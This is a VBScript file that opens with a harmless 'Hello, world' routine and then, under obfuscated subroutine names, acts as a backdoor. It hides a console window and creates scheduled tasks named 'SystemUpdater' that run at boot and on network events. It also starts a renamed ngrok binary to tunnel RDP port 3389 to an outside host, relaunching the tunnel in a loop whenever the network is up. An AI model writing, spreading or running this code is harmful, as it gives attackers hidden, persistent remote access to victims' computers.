Set objShell = CreateObject("WScript.Shell")

Sub Hello_world()
    For i = 1 To 5
        WScript.Echo "Hello, world"
    Next
End Sub

Sub zjWkMQ()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd /c ""mode con: cols=20 lines=1 && title Hidden Console && start /min cmd /c echo .""", 0, False
End Sub

Sub EJViDE()
    Dim wMHSg
    wMHSg = "start /b conf tcp 3389" ' Modify the name from ngrok to conf
    objShell.Run wMHSg, 0, False
End Sub

Sub GbtGpU()
    Dim taskName, taskAction, createTaskCmd, createNetworkTaskCmd
    taskName = "SystemUpdater"
    taskAction = "C:\Windows\System32\SystemUpdater.vbs"

    createTaskCmd = "schtasks /create /tn """ & taskName & """ /tr """ & taskAction & """ /sc ONSTART /f"
    objShell.Run createTaskCmd, 0, False

    createNetworkTaskCmd = "schtasks /create /tn """ & taskName & "Network"" /tr """ & taskAction & """ /sc ONEVENT /ec NetworkProfile /mo *[System/EventID=10000] /f"
    objShell.Run createNetworkTaskCmd, 0, False
End Sub

Hello_world
Call zjWkMQ
WScript.Sleep 60000 ' Sleep for 1 minute
Call GbtGpU
Call EJViDE
WScript.Sleep 60000 ' Sleep for 1 minute

Do
    If objShell.Run("ping -n 1 google.com", 0, True) = 0 Then
        Call EJViDE
    Else
        WScript.Sleep 10000 ' Sleep for 10 seconds
    End If
    WScript.Sleep 60000 ' Sleep for 1 minute
Loop
